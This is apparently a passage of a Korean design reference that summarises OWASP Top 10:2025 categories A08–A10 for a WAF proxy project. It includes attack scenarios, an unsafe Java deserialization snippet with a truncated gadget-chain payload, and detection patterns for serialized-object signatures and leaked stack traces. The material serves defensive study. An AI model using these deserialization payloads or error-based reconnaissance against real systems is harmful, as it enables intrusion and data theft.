> **A03(공급망 실패)과의 차이점:** A03은 빌드·배포·업데이트 과정의 거시적 공급망 실패, **A08은 코드·데이터 아티팩트 레벨의 무결성 검증 실패**

### 개요

소프트웨어 업데이트·중요 데이터·CI/CD 파이프라인이 무결성 검증 없이 신뢰 경계를 넘을 때 발생. 역직렬화(Deserialization) 공격, 무서명 업데이트, 신뢰되지 않는 플러그인 포함이 주요 사례다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 14개 |
| 최대 발생률 | 8.98% |
| 평균 발생률 | 2.75% |
| 총 발생 건수 | 501,327건 |

### 공격 시나리오

**시나리오 1: 외부 서비스 포함 (신뢰 경계 위반)**
```
company.com → 외부 지원 서비스: myCompany.SupportProvider.com
DNS 매핑: myCompany.SupportProvider.com → support.myCompany.com

결과: myCompany.com 도메인 쿠키(인증 토큰 포함)가
      SupportProvider 서버로도 전송
→ 지원 서비스 제공자가 모든 사용자 세션 탈취 가능
```

**시나리오 2: 서명 없는 펌웨어 업데이트**
```
가정용 라우터, 셋톱박스, IoT 기기
→ 펌웨어 업데이트 서명 검증 없이 적용
→ 공격자가 악성 펌웨어 서버 구축
→ 중간자 공격으로 악성 펌웨어 배포
→ 수백만 기기 동시 장악 가능
```

**시나리오 3: 안전하지 않은 역직렬화 (RCE)**
```java
// 취약: 신뢰되지 않는 Java 직렬화 데이터 처리
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // ← 악성 페이로드 실행 가능

// 공격자가 전송하는 base64 인코딩 Java 직렬화 객체:
// rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLk... (악성 가젯 체인)
```

**시나리오 4: CI/CD 파이프라인 신뢰되지 않는 소스**
```yaml
# 위험: 검증 없는 외부 액션 사용
- uses: random-user/some-action@main  # 해시 고정 없음

# 안전: 특정 커밋 해시로 고정
- uses: random-user/some-action@a4b2c3d  # SHA 고정
```

### 방어 방법

- **디지털 서명** 또는 유사 메커니즘으로 소프트웨어·데이터 출처 및 무결성 검증
- 라이브러리 및 의존성은 **신뢰된 저장소에서만** 사용
- 코드·설정 변경에 대한 **리뷰 프로세스** 구축
- CI/CD 파이프라인 **적절한 분리·설정·접근 제어**
- 신뢰되지 않는 클라이언트로부터의 **서명 없는 직렬화 데이터 거부**
- JSON 웹 서명(JWS) 또는 HMAC으로 **데이터 무결성 보호**

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a08.py 탐지 포인트
탐지_대상 = [
    "Java 직렬화 매직 바이트: rO0AB (base64) 또는 aced0005 (hex)",
    "PHP 직렬화 패턴: O:숫자:\"클래스명\" 형식",
    "Python pickle 패턴: 의심스러운 pickle 데이터",
    "Webhook/콜백 서명 검증 헤더 없는 요청",
    "응답 내 외부 JS 스크립트 SRI(Subresource Integrity) 없음",
    "CDN/외부 소스 소프트웨어 업데이트 요청 (서명 검증 없음)",
]
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-345 | 데이터 진정성 불충분한 검증 |
| CWE-494 | 무결성 검사 없는 코드 다운로드 |
| CWE-502 | 신뢰되지 않는 데이터 역직렬화 |
| CWE-829 | 신뢰되지 않는 제어 영역의 기능 포함 |
| CWE-915 | 동적 결정 객체 속성의 부적절한 수정 제어 |

---

## A09:2025 — Security Logging and Alerting Failures (보안 로깅 및 알림 실패)

> **"Monitoring" → "Alerting" 강조로 명칭 변경** | 커뮤니티 투표 3회 연속 선정

### 개요

로깅·모니터링 없이는 공격과 침해를 탐지할 수 없으며, **알림 없이는 보안 사고에 신속하게 대응하기 매우 어렵다.** CVE/CVSS 데이터에서 과소 표현되지만 가시성·사고 대응·포렌식에 매우 큰 영향을 미친다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 5개 |
| 최대 발생률 | 11.33% |
| 평균 발생률 | 3.91% |
| 총 발생 건수 | 260,288건 |
| 관련 CVE 수 | 723개 (낮지만 영향은 매우 큼) |

### 취약한 상태 징후

```
□ 로그인·접근 제어 실패·입력 검증 실패가 로깅되지 않음
   (성공 로그인만 기록, 실패 로그인 미기록)
□ 경고·오류에 대한 불명확한 로그 메시지
□ 로그 무결성 보호 없음 (조작·삭제 가능)
□ 애플리케이션·API 로그의 의심 활동 미모니터링
□ 로그가 로컬에만 저장 (백업 없음)
□ 적절한 알림 임계값·에스컬레이션 프로세스 없음
□ DAST/침투 테스트가 알림을 트리거하지 않음
□ 실시간 또는 준실시간 활성 공격 탐지·알림 불가
□ 로그에 PII·PHI·비밀번호 등 민감 정보 저장 (A01 참조)
□ 로그 데이터 인코딩 미적용 → 로그 인젝션 공격 취약
□ 오탐(False Positive) 과다 → SOC 팀 경보 피로
□ 플레이북·유스케이스 없거나 오래된 상태
```

### 실제 침해 사례

**사례 1: 7년간 탐지 못한 의료 데이터 유출**
```
어린이 건강보험 웹사이트 운영자
→ 외부 제보자에 의해 침해 사실 인지
→ 공격자가 350만 아동 민감 의료 데이터 접근·수정
→ 사후 분석: 로깅·모니터링 시스템 부재
→ 침해 기간: 2013년부터 7년 이상
```

**사례 2: 유럽 항공사 GDPR 벌금**
```
결제 애플리케이션 취약점 공격
→ 40만 고객 결제 정보 수집
→ GDPR 위반으로 2,000만 파운드 벌금
→ 로깅 시스템이 있었다면 조기 탐지 가능
```

### 방어 방법

- 로그인·접근 제어·서버 측 검증 실패를 **충분한 사용자 컨텍스트와 함께** 로깅
- 모든 보안 제어의 **성공·실패 모두** 로깅
- **로그 관리 솔루션이 쉽게 소비 가능한 표준 형식** 사용
- 로그 데이터 **올바른 인코딩** (로그 인젝션 방지)
- **변조·삭제 방지** 감사 추적 (append-only DB 테이블 등)
- **허니토큰(Honeytoken)** 활용 — DB·데이터에 덫 배치, 접근 시 즉각 알림 (오탐 거의 없음)
- **NIST 800-61r2** 기반 사고 대응·복구 계획 수립
- SOC 팀이 실제 공격을 인식하고 대응하도록 **플레이북** 유지
- 행동 분석·AI로 **저오탐율 알림** 보조

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a09.py 탐지 포인트 및 메타 레이어 역할
# 이 모듈은 WAF 자체의 로깅 완전성을 강제하는 메타 레이어

탐지_기능 = {
    "이벤트_완전성_검사": "다른 9개 모듈 탐지 이벤트 누락 여부 감사",
    "반복_공격_알림": "동일 IP·페이로드 패턴 N회 이상 시 알림 훅 발송",
    "감사_추적_표준화": "OWASP 태그·타임스탬프·클라이언트IP·판정근거 필수 포함",
    "로그_인젝션_방지": "로그에 기록되는 사용자 입력 이스케이프 처리",
    "민감정보_마스킹": "비밀번호·토큰·신용카드 번호 로그 저장 전 마스킹",
    "알림_채널": "Slack Webhook, 이메일, SIEM 연동",
}

# 표준 로그 스키마 (모든 모듈 공통)
이벤트_스키마 = {
    "timestamp": "ISO 8601",
    "client_ip": "해시 처리 가능",
    "method": "GET|POST|PUT|DELETE 등",
    "path": "요청 경로",
    "owasp_tags": ["A05:2025", "A01:2025"],  # 복수 태그 가능
    "rule_id": "탐지 규칙 ID",
    "blocked": True,
    "remediation_generated": True,
    "llm_used": False,
    "latency_ms": 12,
}
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-117 | 로그에 대한 부적절한 출력 중화 (로그 인젝션) |
| CWE-223 | 보안 관련 정보 생략 |
| CWE-532 | 로그 파일에 민감 정보 삽입 |
| CWE-778 | 불충분한 로깅 |

---

## A10:2025 — Mishandling of Exceptional Conditions (예외 조건 오처리)

> **2025년 신규 카테고리** | CWE 24개 | 2021년 SSRF가 제외되고 신규 도입

### 개요

소프트웨어가 비정상적이고 예측 불가능한 상황을 **예방·탐지·대응**하지 못할 때 발생하는 충돌·예기치 않은 동작·취약점. 2021년 A10이었던 SSRF는 A01(접근 제어)로 흡수되었고, 이 자리에 오류 처리 관련 취약점이 신규 편입되었다.

### 통계

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 24개 |
| 최대 발생률 | 20.67% |
| 평균 발생률 | 2.95% |
| 총 발생 건수 | 769,581건 |

### 예외 조건 오처리의 3가지 실패

```
┌─────────────────────────────────────────────────────────┐
│              예외 조건 오처리의 3가지 실패 유형               │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ 1. 예방 실패 (Prevention Failure)                        │
│    비정상 상황 자체를 막지 못함                             │
│    예: 입력 길이 제한 없음 → 버퍼 오버플로우                  │
│                                                         │
│ 2. 탐지 실패 (Detection Failure)                         │
│    예외가 발생했음을 인식하지 못함                           │
│    예: catch(Exception e) {} — 빈 캐치 블록              │
│                                                         │
│ 3. 대응 실패 (Response Failure)                          │
│    예외를 인식했지만 부적절하게 처리함                       │
│    예: 오류 상세 정보를 사용자에게 그대로 노출                │
│         또는 트랜잭션 롤백 없이 부분 처리 완료               │
└─────────────────────────────────────────────────────────┘
```

### 발생 원인

```
□ 불완전하거나 누락된 입력 검증
□ 함수 발생 위치가 아닌 상위 레벨의 늦은 오류 처리
□ 메모리·권한·네트워크 등 환경 상태 예외
□ 일관되지 않은 예외 처리 방식
□ 완전히 처리되지 않는 예외 → 알 수 없는 상태로 진입
```

### 취약점으로 이어지는 결과

```
논리 버그, 오버플로우, 레이스 컨디션, 사기 거래,
메모리·상태·리소스·타이밍·인증·인가 문제
→ 시스템의 기밀성·가용성·무결성 침해
```

### 공격 시나리오

**시나리오 1: 리소스 고갈 (DoS)**
```
파일 업로드 시 예외 처리 → 리소스 미해제
     ↓
예외 발생마다 파일 핸들·메모리 잠금
     ↓
누적으로 모든 리소스 소진 → 서비스 중단
```

**시나리오 2: 오류 메시지로 정찰**
```
공격자가 의도적으로 DB 오류 유발
     ↓
HTTP 500: "NullPointerException at UserRepository.java:89
            Query: SELECT * FROM users WHERE id='1''
            Connection: PostgreSQL 14.2 at 10.0.0.5:5432"
     ↓
공격자가 DB 타입·버전·내부 IP·쿼리 구조 파악
     ↓
정밀한 SQL Injection 공격 설계
```

**시나리오 3: 금융 거래 상태 부패 (Race Condition)**
```
트랜잭션 순서: 출금 → 입금 → 로그 기록

중간 단계에서 네트워크 오류 발생:
- 출금 완료
- 입금 실패 (오류 발생)
- 시스템이 트랜잭션 롤백 없이 부분 완료 처리
     ↓
결과: 출금만 되고 입금 없음 (자금 소실)
     또는 공격자가 레이스 컨디션으로 중복 입금 유발
```

### 방어 방법

- **예외가 발생하는 지점에서 즉시 처리** (상위 레벨 일괄 처리 위험)
- **글로벌 예외 핸들러** 유지 (누락 예외 최후 방어선)
- 예외 처리 시 **throw(사용자 친화적 오류)·로깅·필요 시 알림** 3단계 수행
- 중간 처리 중 오류 시 **전체 트랜잭션 롤백 (Fail Closed)**
- **레이트 리밋·리소스 쿼터·스로틀링** 적용으로 예외 상황 사전 방지
- 동일 오류가 특정 빈도 초과 시 **통계 집계로만** 출력 (로그 폭발 방지)
- 반복 오류 패턴 모니터링으로 **진행 중인 공격** 탐지
- 조직 전체 **일관된 예외 처리 패턴** 적용
- 스트레스·성능·침투 테스트로 예외 처리 **검증**

### WAF 프록시 탐지 전략 (본 프로젝트)

```python
# owasp/a10.py 탐지 포인트
탐지_대상 = [
    "응답 본문에 스택 트레이스 포함: Traceback, Exception, NullPointerException",
    "응답 본문에 내부 IP·DB 연결 정보 노출",
    "과도한 에러 상세: SQL 쿼리·파일 경로·라이브러리 버전 포함",
    "5xx 오류 코드 비정상 패턴: 500/502/503 반복",
    "응답 내 디버그 정보: DEBUG=True, SQLALCHEMY_ECHO",
    "오류 유발 페이로드 반복 시도 (에러 기반 정보 수집 공격)",
    "비정상 상태 코드 패턴: 200 OK but 오류 메시지 포함",
]

# 응답 스캔 예시
def scan_response(response_body: str) -> list[str]:
    findings = []
    if "Traceback (most recent call last)" in response_body:
        findings.append("A10:2025 - Python 스택 트레이스 노출")
    if "at org.springframework." in response_body:
        findings.append("A10:2025 - Java/Spring 스택 트레이스 노출")
    if re.search(r"\d+\.\d+\.\d+\.\d+:\d+", response_body):
        findings.append("A10:2025 - 내부 IP:포트 노출 가능성")
    return findings
```

### 주요 관련 CWE

| CWE | 설명 |
|-----|------|
| CWE-209 | 민감 정보가 포함된 오류 메시지 생성 |
| CWE-248 | 처리되지 않은 예외 |
| CWE-476 | NULL 포인터 역참조 |
| CWE-636 | 안전하지 않은 실패 (Failing Open) |
| CWE-703 | 예외 조건의 부적절한 확인 또는 처리 |
| CWE-755 | 예외 조건의 부적절한 처리 |

---

## 종합 요약 및 프로젝트 연계 매트릭스

### OWASP Top 10:2025 전체 개요

| # | ID | 항목 | 핵심 위협 | 주요 CWE 수 | 탐지 가능 여부 (WAF) |
|---|-----|------|-----------|------------|---------------------|
| 1 | A01 | Broken Access Control | IDOR, 강제 브라우징, CSRF, SSRF | 40 | ✅ 부분 (경로·파라미터) |
| 2 | A02 | Security Misconfiguration | 기본계정, 정보노출, XXE, 스택트레이스 | 16 | ✅ 요청+응답 스캔 |
| 3 | A03 | Software Supply Chain | 알려진 취약점, 외부 CDN 조작, 악성 패키지 | 6 | ✅ 부분 (외부 리소스 URL) |
| 4 | A04 | Cryptographic Failures | 평문 전송, 취약 해시, 취약 쿠키 | 32 | ✅ 헤더·쿠키 스캔 |
| 5 | A05 | Injection | SQLi, XSS, CMDi, LDAPi, XPath | 37 | ✅ 시그니처 기반 강력 탐지 |
| 6 | A06 | Insecure Design | 비즈니스 로직 우회, 봇 공격 | 39 | ⚠️ 휴리스틱·LLM 필요 |
| 7 | A07 | Authentication Failures | 브루트포스, 크리덴셜 스터핑, JWT 변조 | 36 | ✅ 레이트리밋·패턴 탐지 |
| 8 | A08 | Software/Data Integrity | 역직렬화, 서명없는 업데이트, CI/CD | 14 | ✅ 부분 (페이로드 시그니처) |
| 9 | A09 | Logging/Alerting Failures | 감사 누락, 알림 부재 | 5 | ✅ WAF 자체 메타 레이어 |
| 10 | A10 | Exceptional Conditions | 오류 정보 노출, 실패 개방, 레이스컨디션 | 24 | ✅ 응답 스캔 |

### 판정 정책 매트릭스 (AI Security System)

```
┌──────┬──────────────────────────┬──────────────────────────┐
│ 단계  │ 조건                      │ 동작                      │
├──────┼──────────────────────────┼──────────────────────────┤
│  L1  │ 시그니처 명백 일치          │ 차단 + 기록 + 대응         │
│      │ (SQL Injection, XSS 등)   │ (리미디에이션 생성)         │
├──────┼──────────────────────────┼──────────────────────────┤
│  L2  │ 애매한 일치                │ LLM 2차 판정 → 차단/허용   │
│      │ (비즈니스 로직 우회 등)     │ + 기록                    │
├──────┼──────────────────────────┼──────────────────────────┤
│  L3  │ LLM 고신뢰 악성 판정       │ 차단 + 대응(리미디에이션)   │
│      │                          │ + 기록                    │
├──────┼──────────────────────────┼──────────────────────────┤
│  L4  │ LLM 불확실 판정            │ 허용(관대) + 기록(경고)     │
│      │ (환경변수로 조정 가능)       │                          │
└──────┴──────────────────────────┴──────────────────────────┘
```

### Juice Shop 시나리오별 OWASP 매핑

| 시나리오 | OWASP 태그 | 탐지 방식 | 대응 내용 |
|---------|-----------|-----------|---------|
| SQL Injection 로그인 우회 | A05:2025 | L1 시그니처 | SQLi 방지 코드 스니펫 |
| 관리자 페이지 강제 접근 | A01:2025 | L1 경로 패턴 | RBAC 구현 가이드 |
| 반복 로그인 실패 | A07:2025 | L1 레이트리밋 | MFA·계정 잠금 구현 가이드 |
| `.env` 파일 접근 시도 | A02:2025 | L1 경로 시그니처 | 보안 설정 가이드 |
| XSS 스크립트 삽입 | A05:2025 | L1 시그니처 | 출력 인코딩 코드 스니펫 |
| 스택 트레이스 응답 노출 | A10:2025 | 응답 스캔 | 오류 처리 구현 가이드 |
| JWT alg:none 공격 | A07:2025 | L1 JWT 검사 | JWT 안전 구현 가이드 |
| 가격 파라미터 변조 | A06:2025 | L2 휴리스틱 | 서버 측 검증 가이드 |
| Java 역직렬화 페이로드 | A08:2025 | L1 시그니처 | 역직렬화 방지 가이드 |
| 쿠키 Secure 플래그 없음 | A04:2025 | 응답 스캔 | 보안 쿠키 설정 가이드 |

---

## 참고 자료

- [OWASP Top 10:2025 공식 사이트](https://owasp.org/Top10/2025/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [NIST 800-63b: Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [MITRE CWE (Common Weakness Enumeration)](https://cwe.mitre.org/)
- [NIST 포스트 퀀텀 암호화 표준 (2024)](https://www.nist.gov/news-events/news/2024/08/nist-releases-first-3-finalized-post-quantum-encryption-standards)
- [AI Security System PLAN.md](../Downloads/PLAN.md)

---

*본 문서는 [OWASP Top 10:2025](https://owasp.org/Top10/2025/) 공식 문서를 기반으로 작성되었으며, AI Security System 프로젝트의 WAF 모듈 설계·구현 참조 자료로 활용한다.*
